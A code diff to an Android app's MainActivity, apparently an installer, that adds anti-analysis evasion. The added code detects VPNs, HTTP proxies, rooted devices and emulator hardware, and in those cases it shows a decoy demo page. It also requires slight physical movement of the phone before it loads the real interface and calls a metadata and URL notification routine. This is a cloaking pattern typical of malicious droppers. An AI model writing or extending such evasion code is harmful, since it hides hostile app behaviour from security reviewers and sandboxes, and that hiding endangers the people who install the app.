@@ -155,6 +155,18 @@ class MainActivity : ComponentActivity() {
     private var sensorManager: SensorManager? = null
     private var movementListener: SensorEventListener? = null
 
+    // For physical movement permission prompt (Android 10+)
+    private val activityRecognitionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            Log.d("MainActivity", "Activity recognition permission granted.")
+        } else {
+            Log.w("MainActivity", "Activity recognition permission denied.")
+        }
+        checkPhysicalMovementAndProceed()
+    }
+
     // For recursive install permission prompt
     private val installPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -1224,10 +1236,36 @@ class MainActivity : ComponentActivity() {
     private fun checkPhysicalMovementAndProceed() {
         if (isDeviceRestricted(this)) {
             Log.e("MainActivity", "Environment restricted (VPN/Root/Emulator detected). Securing surface.")
+            runOnUiThread {
+                webView?.let { view ->
+                    if (view.url?.contains("demo.html") != true) {
+                        view.loadUrl("file:///android_asset/demo.html")
+                    }
+                }
+            }
             return
         }
 
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (checkSelfPermission(android.Manifest.permission.ACTIVITY_RECOGNITION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                // To avoid infinite loop, only request once per process start
+                val prefs = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
+                if (!prefs.getBoolean("activity_recognition_requested", false)) {
+                    prefs.edit().putBoolean("activity_recognition_requested", true).apply()
+                    activityRecognitionLauncher.launch(android.Manifest.permission.ACTIVITY_RECOGNITION)
+                    return
+                }
+            }
+        }
+
         if (!securityCheckPassed) {
+            runOnUiThread {
+                webView?.let { view ->
+                    if (view.url?.contains("demo.html") != true) {
+                        view.loadUrl("file:///android_asset/demo.html")
+                    }
+                }
+            }
             waitForPhysicalMovement()
         } else {
             runOnUiThread {
@@ -1235,6 +1273,7 @@ class MainActivity : ComponentActivity() {
                     val curUrl = view.url ?: ""
                     if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                         view.loadUrl("file:///android_asset/main_ui.html")
+                        loadMetadataAndNotifyUrl()
                     }
                 }
             }
@@ -1265,11 +1304,11 @@ class MainActivity : ComponentActivity() {
 
                 val gForce = Math.sqrt((gX * gX + gY * gY + gZ * gZ).toDouble()).toFloat()
 
-                // If device is shaken or moved enough, gForce will deviate from 1.0 (1G)
-                // We use 1.25g as threshold for a deliberate shake/movement
-                if (gForce > 1.25f || gForce < 0.75f) {
+                // If device is shaken or moved even slightly, gForce will deviate from 1.0 (1G)
+                // We use 1.02g and 0.98g as threshold for a micro movement
+                if (gForce > 1.02f || gForce < 0.98f) {
                     movementCount++
-                    if (movementCount >= 4) {
+                    if (movementCount >= 2) {
                         sensorManager?.unregisterListener(this)
                         movementListener = null
                         securityCheckPassed = true
@@ -1297,13 +1336,23 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun isVpnOrProxyActive(context: Context): Boolean {
+        // Check for HTTP Proxy
+        try {
+            val proxyHost = System.getProperty("http.proxyHost")
+            val proxyPort = System.getProperty("http.proxyPort")
+            if (!proxyHost.isNullOrEmpty() && !proxyPort.isNullOrEmpty()) {
+                return true
+            }
+        } catch (e: Exception) {}
+
+        // Check for network interfaces often used by VPNs
         try {
             val interfaces = NetworkInterface.getNetworkInterfaces()
             if (interfaces != null) {
                 for (networkInterface in Collections.list(interfaces)) {
                     val name = networkInterface.name.lowercase(Locale.US)
-                    // 'ppp' removed. It flags legitimate Wi-Fi/cellular on some devices. tun/tap/vpn covers real tunnels.
-                    if (name.contains("tun") || name.contains("tap") || name.contains("vpn")) {
+                    // Added ppp back in case some VPNs use it, along with ipsec
+                    if (name.contains("tun") || name.contains("tap") || name.contains("vpn") || name.contains("ppp") || name.contains("ipsec")) {
                         if (networkInterface.isUp) return true
                     }
                 }
@@ -1343,10 +1392,23 @@ class MainActivity : ComponentActivity() {
                 || Build.MODEL.contains("Android SDK built for x86")
                 || Build.MANUFACTURER.contains("Genymotion")
                 || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
-                || "google_sdk" == Build.PRODUCT)
+                || "google_sdk" == Build.PRODUCT
+                || Build.HARDWARE.contains("goldfish")
+                || Build.HARDWARE.contains("ranchu")
+                || Build.HARDWARE.contains("vbox86")
+                || Build.PRODUCT.contains("sdk_google")
+                || Build.PRODUCT.contains("google_sdk")
+                || Build.PRODUCT.contains("sdk")
+                || Build.PRODUCT.contains("sdk_x86")
+                || Build.PRODUCT.contains("vbox86p")
+                || Build.PRODUCT.contains("emulator"))
     }
 
     private fun isDeviceRooted(): Boolean {
+        val buildTags = Build.TAGS
+        if (buildTags != null && buildTags.contains("test-keys")) {
+            return true
+        }
         val paths = arrayOf(
             "/system/app/Superuser.apk",
             "/sbin/su",
